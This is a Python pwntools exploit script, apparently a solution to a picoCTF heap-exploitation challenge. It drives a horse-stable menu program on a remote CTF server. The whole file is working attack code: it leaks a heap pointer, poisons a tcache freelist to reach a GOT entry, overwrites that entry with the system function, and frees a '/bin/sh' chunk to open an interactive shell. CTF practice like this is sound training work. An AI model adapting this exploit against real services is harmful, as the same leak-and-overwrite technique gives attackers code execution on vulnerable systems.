#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln2")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ["xfce4-terminal", "--execute"]
args.LOCAL = False
args.DEBUG = False

def conn():
    if args.LOCAL:
        r = process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 63513)

    return r

sock = conn()
#interface:

def head_start(idx, spot, overwrite):
    sock.sendlineafter("Choice: ", str(0))
    sock.sendlineafter("Stable index", str(idx))
    sock.sendlineafter("Enter a string of", overwrite)
    sock.sendlineafter("New spot? ", str(spot))
def add_horse(idx, name, length, nothing = False):
    sock.sendlineafter("Choice: ", str(1))
    sock.sendlineafter("Stable index", str(idx))
    sock.sendlineafter("Horse name length", str(length))
    if nothing :    
        sock.sendlineafter("Enter a string of", '\xff')
    else :
        name = name + ('\00' * (length - len(name)))
        sock.sendlineafter("Enter a string of", name + '\n')
def free_horse(idx):
    sock.sendlineafter("Choice: ", str(2))
    sock.sendlineafter("Stable index", str(idx))
def race_horse():
    sock.sendlineafter("Choice: ", str(3))
def main():
    #alloc 5 chunks each capable of leaking heap:
    i = 0
    for x in range(5) :
        sz = 0x20 + (x * 0x10)
        add_horse(i, "AAAAAA", sz)
        free_horse(i)
        add_horse(i, "", sz, True)
        i += 2
    race_horse()
    data = sock.recvuntil("WINNER: ")
    leak = sock.recvuntil("\n")[0:-2]
    print("data: " + data.hex())
    print("initial leak: " + leak.hex())
    #parse the leak:
    leak += bytes.fromhex("00") * (8 - len(leak))
    leak = u64(leak)
    leak = leak << 12
    print("leak? " + hex(leak))
    #free everything:
    for x in range(5) :
        free_horse(x * 2)
    #try a direct write to libc first:
    #we'll target the 0x20 slot
    add_horse(2, "AAAA", 0x20)
    add_horse(4, "AAAA", 0x20)
    free_horse(2)
    free_horse(4)
    payload = p64((leak >> 12) ^ 0x404010)
    payload += p64(0xdeadbeefdeadbeef)
    head_start(4, 9, payload)
    #now get the chunk and call system:
    add_horse(6, "/bin/sh", 0x20)
    overwrite = p64(0xdeadbeef) #padding
    overwrite += p64(0x401090) #actual overwrite
    sock.sendlineafter("Choice: ", str(1))
    sock.sendlineafter("Stable index", str(8))
    sock.sendlineafter("Horse name length", str(0x20))
    sock.sendlineafter("Enter a string of", overwrite)
    sock.sendline('\xff')
    free_horse(6)
    sock.interactive()


if __name__ == "__main__":
    main()
